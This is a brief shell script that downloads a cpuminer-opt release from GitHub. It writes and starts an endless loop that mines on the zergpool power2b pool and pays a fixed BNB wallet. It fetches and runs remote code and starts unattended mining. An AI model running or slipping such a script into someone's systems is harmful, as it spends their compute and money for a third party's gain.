#!bin/sh
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && tar zxvf cpuminer-opt-linux.tar.gz && echo '#!/bin/sh
while [ 1 ]; do
./cpuminer-avx2 -a power2b -o stratum+tcp://power2b.mine.zergpool.com:7445 -u bnb1e4gahzl946dx4d7g62syny5vx4fvzg445u2c3k -p c=TRX
done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh
